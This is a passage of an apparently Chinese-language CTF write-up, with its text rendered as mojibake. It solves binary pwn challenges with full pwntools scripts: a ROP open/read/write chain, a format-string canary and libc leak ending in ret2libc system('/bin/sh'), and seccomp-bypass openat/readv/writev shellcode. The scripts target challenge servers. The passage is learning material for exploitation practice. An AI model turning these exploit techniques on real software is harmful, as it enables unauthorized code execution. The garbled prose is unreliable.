è¦å¯«å…¥çš„ä½å…ƒçµ„æ•¸ï¼ˆé€šå¸¸ä½¿ç”¨readè¿”å›çš„ä½å…ƒçµ„æ•¸ï¼Œä½†æˆ‘å€‘ä¹Ÿå¯ä»¥è¨­å®šä¸€å€‹å›ºå®šçš„å€¼ï¼‰</p><p>æ³¨æ„ï¼šåœ¨ORWä¸­ï¼Œæˆ‘å€‘é€šå¸¸å°‡è®€å–çš„å…§å®¹å¯«åˆ°æ¨™æº–è¼¸å‡ºï¼ˆfd&#x3D;1ï¼‰ä»¥ä¾¿çœ‹åˆ°æª”æ¡ˆå…§å®¹ã€‚</p><br/><p>å…ˆç”¨ROPgadgetæ‰¾æ‰¾å¯„å­˜å™¨:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary noshell  --only &#x27;pop|ret&#x27; | grep &#x27;rdi&#x27;</span><br><span class="line">ROPgadget --binary noshell  --only &#x27;pop|ret&#x27; | grep &#x27;rsi&#x27;</span><br><span class="line">ROPgadget --binary noshell  --only &#x27;pop|ret&#x27; | grep &#x27;rdx&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004013f3 : pop rdi ; ret</span><br><span class="line">0x00000000004013f5 : pop rsi ; ret</span><br><span class="line">0x00000000004013f7 : pop rdx ; ret</span><br></pre></td></tr></table></figure><p>payload &#x3D; bâ€™aâ€™ (0x20 + 8 )</p><p>payload +&#x3D; pop_rdi +  flag_addr</p><p>payload +&#x3D; rsi + p64(0)</p><p>payload +&#x3D; pop_rdx + p64(0) </p><p>payload  +&#x3D; open </p><p>é€™æ˜¯ä¸€å€‹openå‡½æ•¸çš„å‹•ä½œ , å…ˆæ‰¾ä¸€æ‰¾flag.txt </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary noshell --string &quot;./flag&quot;</span><br></pre></td></tr></table></figure><img src="defe5f0b422abdd4d61adb4393cdf203.png" alt="screen-capture.png"  /><p>flag.txt &#x3D; 0x40206a</p><p>çœæµ: å¯ä»¥ç”¨p64(p.plt[â€˜openâ€™]) , ä¸éå¯ä»¥è‡ªå·±æ‰¾</p><p>åœ¨IDAæ‰¾åˆ°äº†open_the_door è¿½è¹¤ä¸€ä¸‹call open  </p><img src="344110f1e821dc33778caecb38fb0c7f.png" alt="screen-capture.png"  /><img src="cb8b8afe3c649b025f199ccbd857b3f9.png" alt="screen-capture.png"  /><p>open &#x3D; 0x4011E0</p><p>æ¥ä¸‹ä¾†æ˜¯read </p><p>read( 3 , bss , 0x100) </p><p>payload &#x3D; p64(magic)</p><p>#payload +&#x3D; pop_rdi + p64(3)</p><p>payload +&#x3D; pop_rsi + p64(bss)</p><p>payload +&#x3D; pop_rdx +p64(0x100)</p><p>payload +&#x3D; read()</p><p>è®€256å€‹å­—ç¯€</p><p>magic æ˜¯ä»€éº¼?</p><p>åœ¨IDA alt+b æŸ¥ 48 89 C7 , æ‰¾åˆ°äº†ä¸€å€‹æœ‰retçš„</p><img src="e39231ce6c528dad0c08a1adae63a8ed.png" alt="screen-capture.png"  /><p>magic &#x3D; 0x04013F9</p><p>æ¥ä¸‹ä¾†æ˜¯writeæ“ä½œ:<br>payload &#x3D; pop_rdi + p64(1) + p64(p.plt[â€˜writeâ€™])</p><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;8.147.132.32&#x27;</span>, <span class="number">18505</span>)</span><br><span class="line"><span class="comment">#nc 8.147.132.32 18505</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./noshell&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./noshell&#x27;</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4013f3</span> </span><br><span class="line">pop_rsi = <span class="number">0x4013f5</span></span><br><span class="line">pop_rdx = <span class="number">0x4013f7</span></span><br><span class="line">flag = <span class="number">0x40206a</span></span><br><span class="line">magic = <span class="number">0x4013F9</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(pop_rdi) +p64(flag) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(e.plt[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">payload += p64(magic) + p64(pop_rsi) + p64(e.bss(<span class="number">0x400</span>)) + p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(e.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(e.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Do you want to say something?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;leave or capture the flag?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-input-small-function-å‘³å¤åˆ»"><a href="#4-input-small-function-å‘³å¤åˆ»" class="headerlink" title="4.input_small_function(å‘³å¤åˆ»)"></a>4.input_small_function(å‘³å¤åˆ»)</h2><h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="fmt-and-canary"><a href="#fmt-and-canary" class="headerlink" title="fmt and canary"></a>fmt and canary</h2><h3 id="Ubuntu-GLIBC-2-35-0ubuntu3-10"><a href="#Ubuntu-GLIBC-2-35-0ubuntu3-10" class="headerlink" title="Ubuntu GLIBC 2.35-0ubuntu3.10"></a>Ubuntu GLIBC 2.35-0ubuntu3.10</h3><p><a href="https://www.bilibili.com/video/BV11t4y1R7dV/?spm_id_from=333.337.search-card.all.click&vd_source=b128d59725d91ecef706ce0b01795a8f">https://www.bilibili.com/video/BV11t4y1R7dV/?spm_id_from&#x3D;333.337.search-card.all.click&amp;vd_source&#x3D;b128d59725d91ecef706ce0b01795a8f</a></p><p>æ‰“é–‹IDA  alt+ t æœ ubuntu </p><img src="ae62107e978fff735b26809634275271.png" alt="screen-capture.png"  /><p>ä¸‹è¼‰patchelf å’Œ glibc-all-in-one</p><p>patchelfå®‰è£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt -y install patchelf</span><br></pre></td></tr></table></figure><p>glibc-all-in-oneå®‰è£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">git clone https://gitclone.com/github.com/matrix1001/glibc-all-in-one</span><br><span class="line"></span><br><span class="line">cd glibc-all-in-one</span><br><span class="line"></span><br><span class="line">sudo python3 update_list</span><br><span class="line"></span><br><span class="line">cat list</span><br><span class="line"></span><br><span class="line">#éœ€è¦ä½¿ç”¨çš„Ubuntu </span><br><span class="line">sudo ./download x.xx-xubuntux_xxx</span><br><span class="line">#ä»¥æˆ‘çš„é¡Œç‚ºä¾‹</span><br><span class="line">sudo ./download 2.35-0ubuntu3.11_amd64</span><br><span class="line">#list æœ‰ list å’Œ old_list</span><br><span class="line">sudo ./download_old x.xx-xubuntux_xxx</span><br></pre></td></tr></table></figure><p>ç”¨patchelfæ›´æ› libc å’Œ ld æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#æ›ldæ–‡ä»¶</span><br><span class="line">patchelf --set-interpreter /??/??/??  ç¨‹å¼</span><br><span class="line">#é€™ä¸€é¡Œ</span><br><span class="line">patchelf --set-interpreter home/ghsc/glibc-all-in-one/libs/2.35-0ubuntu3.11_amd64/ld-linux-x86-64.so.2  fmt_canary</span><br><span class="line">#æ›libcæ–‡ä»¶</span><br><span class="line">patchelf --replace-needed libc.so.6 /??/??/?? ç¨‹å¼</span><br><span class="line">#é€™ä¸€é¡Œï¼Œå…ˆæ¢å¤åŸå§‹çŠ¶æ€ï¼ˆå¦‚æœéœ€è¦ï¼‰</span><br><span class="line">patchelf --replace-needed home/ghsc/glibc-all-in-one/libs/2.35-0ubuntu3.11_amd64/libc.so.6 libc.so.6 fmt_canary</span><br><span class="line">patchelf --replace-needed libc.so.6 home/ghsc/glibc-all-in-one/libs/2.35-0ubuntu3.11_amd64/libc.so.6  fmt_canary</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="ea4b089eb27806b3cb21659062979649.png" alt="screen-capture.png"  /><p>é–‹äº†NX , å‹•é€£ , è¦ç”¨libcå‡½æ•¸äº† , RELRO: Partial RELRO , IDAä¸€ä¸‹ :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s[40]; // [rsp+0h] [rbp-30h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  puts(&amp;::s);</span><br><span class="line">  puts(&amp;s_);</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    memset(s, 0, sizeof(s));</span><br><span class="line">    puts(&amp;s__0);</span><br><span class="line">    read(0, s, 0x27u);</span><br><span class="line">    printf(s);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( strcmp(s, &quot;end\n&quot;) );</span><br><span class="line">  puts(&amp;s__1);</span><br><span class="line">  printf(&amp;format);</span><br><span class="line">  read(0, s, 0x100u);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆåˆ¤æ–·æ”»æ“Šé» , å¤§æ¦‚æ˜¯åœ¨æ‰“äº†endå¾Œ æœ‰ä¸€å€‹read(0 , s ,0x100u)</p><hr><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p>å…©å€‹read , ä¸€å€‹0x28å­—ç¯€ , ä¸€å€‹0x100å­—ç¯€ ,  å…ˆæ‰¾åˆ°canaryå…ˆ</p><p>b *0x4012D4</p><p>cyclicä¸€ä¸‹ , stack 30 </p><img src="38914278c811ac30f307420157097042.png" alt="screen-capture.png"  /><p>ä¸é›£çœ‹å‡ºcanaryå°±åœ¨rbp-0x8 </p><p> 0x7fffffffd508 â—‚â€” 0xad7425d44ff65a00</p><img src="ace979370317ac6777209432f8a910c8.png" alt="screen-capture.png"  /><p>æ‰¾å°äº† , ç®—ä¸€ç®—åç§»é‡ ,  (0x508 - 0x4e0)&#x2F;8 &#x3D; 5</p><img src="b11ccd5cf72b0fda7b0b176e269d4aa4.png" alt="screen-capture.png"  /><p>å­—ç¬¦ä¸²åç§»é‡ç‚º6  , 6+5 &#x3D; 11</p><p>%11$p :<br><img src="dd0a1909e4d111d5a162f737b16e6af8.png" alt="screen-capture.png"  /></p><p>æˆåŠŸæ‰¾åˆ° canary </p><hr><h3 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h3><p>libcçš„åŸºç¤:</p><p><a href="https://www.bilibili.com/video/BV1mr4y1Y7fW?spm_id_from=333.788.videopod.episodes&vd_source=b128d59725d91ecef706ce0b01795a8f&p=20">https://www.bilibili.com/video/BV1mr4y1Y7fW?spm_id_from&#x3D;333.788.videopod.episodes&amp;vd_source&#x3D;b128d59725d91ecef706ce0b01795a8f&amp;p&#x3D;20</a></p><p>ç„¶å¾Œè¦å¯«ä¸€ä¸‹ ret2libc  , åƒè€ƒæ–‡ç« : </p><p><a href="https://starrysky1004.github.io/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/">https://starrysky1004.github.io/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/</a></p><p>ç”¨IDAé–‹ä¸€ä¸‹llibc.so.6</p><p>gdb vmmap ä¸€ä¸‹ :<br><img src="8cec771cddee1684595214e44bc1f9bb.png" alt="screen-capture.png"  /></p><p> 0x7ffff7c00000 - 0x7ffff7e1c000  æ˜¯libc çš„å€åŸŸ  , å¦‚æœè¦èª¿ç”¨çš„è©±è¦å…ˆç®—ä¸€ç®—åç§»é‡</p><img src="97d10cc3ca79658e4a25b6b472f02ad6.png" alt="screen-capture.png"  /><p>æ‰¾ä¸€ä¸‹ROPgadget , <strong>pop_rdi &#x3D; åŸºå€ + 0x2a3e5</strong>  , åœ¨libcæ‰¾åˆ°äº† â€œ&#x2F;bin&#x2F;shâ€ :</p><img src="35c004db1f00a6867790da1951ab189e.png" alt="screen-capture.png"  /><p><strong>sh_addr &#x3D; åŸºå€ + 0x1d8678</strong></p><p> æ‰¾â€&#x2F;bin&#x2F;shâ€ å’Œ systemå‡½æ•¸:</p><img src="0d5ddaf3cd76a7041ec020cf0497f7fe.png" alt="screen-capture.png"  /><p>bin&#x2F;sh:  åŸºå€ + 0x1D8678</p><img src="0e369501325e153d6279ad86724aabb9.png" alt="screen-capture.png"  /><p>system:  åŸºå€ + 0x50D70</p><br/><h3 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²libcåŸºå€"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²libcåŸºå€" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²libcåŸºå€"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²libcåŸºå€</h3><p><a href="https://www.cnblogs.com/GGbomb/p/17872974.html">https://www.cnblogs.com/GGbomb/p/17872974.html</a></p><br/><p>åœ¨canaryå¾Œé¢æœ‰ä¸€å€‹__libc_start_call_main+122 : 0x7ffff7c2a1ca</p><p>ç”¨vmmapæ‰¾åˆ°åŸºå€:</p><img src="6623abda426005e1b34c7f7ffb9759ae.png" alt="92fb3825-187e-415a-85c4-e5891e11b509.png"  /><p>0x7ffff7c29e40-0x7ffff7c00000 &#x3D; 0x29E40</p><img src="d1106da3ce6626e9f3cf76358ba6be05.png" alt="b5349a57-5bfa-4cb3-a2a2-c953fae619fb.png"  /><p>(0xd568-0xd4b8 )&#x2F;8 &#x3D; 22<br>11+22 &#x3D; 33</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaa%11$.p%33%p</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#nc 47.94.87.199 39160</span></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;47.94.87.199&#x27;,39160)     </span></span><br><span class="line">p = process(<span class="string">&#x27;./fmt_canary&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./fmt_canary&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;aaaa%11$p.%13$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;è¯´è¯!\n&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;00&#x27;</span>).decode(),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"><span class="comment">#libcçš„</span></span><br><span class="line">libc = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).decode(),<span class="number">16</span>)</span><br><span class="line">libc_base = libc - <span class="number">0x2a1ca</span></span><br><span class="line"></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x2a3e5</span></span><br><span class="line">sh_addr = libc_base + <span class="number">0x1d8678</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x50D70</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p>ç„¶å¾Œå°±æ˜¯æ­£å¸¸çš„libcäº† , </p><img src="1d6f85f88116b19907ddd029f6c16602.png" alt="screen-capture.png"  /><img src="ffd06d9481921c7c8ae347b52de09d76.png" alt="screen-capture.png"  /><br/><img src="31833bab8ba39c21e0633c09bde6491a.png" alt="screen-capture.png"  /><img src="3e112562cc15017bdb039fa9f0ff5915.png" alt="screen-capture.png"  /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># nc 39.106.48.123 28287</span></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;39.106.48.123&#x27;</span>,<span class="number">28287</span>)   </span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)      </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./fmt_canary&#x27;)</span></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./fmt_canary&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;æˆ‘å…ˆæ”¾å°å¤è¯»æœºåœ¨è¿™é‡Œ!è¦æ˜¯è§‰å¾—åŒå€¦äº†å°±è¾“å…¥endæ¥ç»“æŸå§\n&#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;aaaa%11$p.%33$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;è¯´è¯!\n&#x27;</span>,payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;00&#x27;</span>).decode(),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#libcçš„</span></span><br><span class="line">libc_a = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).decode(),<span class="number">16</span>)</span><br><span class="line">libc_base = libc_a - <span class="number">0x29E40</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x29139</span> + libc_base</span><br><span class="line">pop_rdi = <span class="number">0x2A3e5</span> + libc_base</span><br><span class="line">binsh = <span class="number">0x1D8678</span> + libc_base</span><br><span class="line">system = <span class="number">0x50D70</span> + libc_base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_a))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;è¯´è¯!\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;end&quot;</span>) </span><br><span class="line">p.recvuntil(<span class="string">&#x27;QwQ:&#x27;</span>)</span><br><span class="line"><span class="comment">#p.sendline(&quot;end&quot;) </span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="sandbox-plus"><a href="#sandbox-plus" class="headerlink" title="sandbox_plus"></a>sandbox_plus</h2><p> seccomp-tools dump .&#x2F;sandbox_plus ä¸€ä¸‹</p><img src="c47060c8f2cf28feff3ccdb4539374cb.png" alt="screen-capture.png"  /><p>è¢«ban ARCH_X86_64 execve  execveat  open  read write sendfile æ€éº¼è¾¦?</p><img src="5f6659df11542ee2ce1483cb40440f4b.png" alt="screen-capture.png"  /><p>çœ‹äº†mainå‡½æ•¸æ˜é¡¯é€™æ˜¯ä¸€å€‹Shellcode é¡Œç›®:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __fastcall main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  void *buf; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  buf = mmap((void *)<span class="number">0x114514</span>, 0x1000u, <span class="number">7</span>, <span class="number">34</span>, -<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  puts(<span class="string">&quot;please input a orw_plus function (also also after compile)&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, 0x500u);</span><br><span class="line">  install_seccomp();</span><br><span class="line">  ((void (*)(void))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> buf &#x3D; mmap((void *)0x114514, 0x1000u, 7, 34, -1, 0);æ˜¯æŒ‡æ”¹è®Š0x114514 è™•çš„è¨˜æ†¶é«”æ˜ å°„ç‚ºå¯è®€ã€å¯å¯«ã€å¯åŸ·è¡Œ</p><p>Shellcode æ§‹é€  (AORW):</p><p>è¨­ç½® iovec çµæ§‹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rax, &#123;buffer_addr&#125;</span><br><span class="line">mov qword ptr [&#123;iovec_addr&#125;], rax</span><br><span class="line">mov qword ptr [&#123;iovec_addr&#125; + 8], 0x100</span><br></pre></td></tr></table></figure><p>openat(â€œflag.txtâ€):</p><ul><li><pre><code>å°‡ &quot;flag.txt&quot; å­—ä¸²å¯«å…¥å†…å­˜<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```assembly_x86</span><br><span class="line">mov rdi, &#123;flag_str_addr&#125;</span><br><span class="line">mov rsi, 0x7478742e67616c66  // &quot;flag.txt&quot;</span><br><span class="line">mov qword ptr [rdi], rsi</span><br></pre></td></tr></table></figure></code></pre></li><li><pre><code>openat(AT_FDCWD, &quot;flag.txt&quot;, O_RDONLY, 0) , syscall æ˜¯æŒ‡ä»¤åœ°å€<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```assembly_x86</span><br><span class="line">mov rax, 0x101               // __NR_openat = 257</span><br><span class="line">mov rdi, 0xFFFFFF9C          // AT_FDCWD (-100)</span><br><span class="line">mov rsi, &#123;flag_str_addr&#125;     // &quot;flag.txt&quot;</span><br><span class="line">xor rdx, rdx                 // O_RDONLY</span><br><span class="line">syscall                      // RAX = fd</span><br></pre></td></tr></table></figure></code></pre></li></ul><p>readv(fd, &amp;iov, 1):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, rax                 // RDI = fd</span><br><span class="line">mov rax, 0x13                // __NR_readv = 19</span><br><span class="line">mov rsi, &#123;iovec_addr&#125;        // RSI = &amp;iovec</span><br><span class="line">mov rdx, 0x1                 // RDX = 1 (iovec count)</span><br><span class="line">syscall                      // è®€å–å…§å®¹</span><br></pre></td></tr></table></figure><p>writev(STDOUT, &amp;iov, 1):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x14                // __NR_writev = 20</span><br><span class="line">mov rdi, 0x1                 // RDI = STDOUT_FILENO (1)</span><br><span class="line">mov rsi, &#123;iovec_addr&#125;        // RSI = &amp;iovec</span><br><span class="line">mov rdx, 0x1                 // RDX = 1 (iovec count)</span><br><span class="line">syscall                      // è¼¸å‡ºå…§å®¹</span><br></pre></td></tr></table></figure><p>exit(0):</p><figure class="highlight plaintext"><table><tr><td 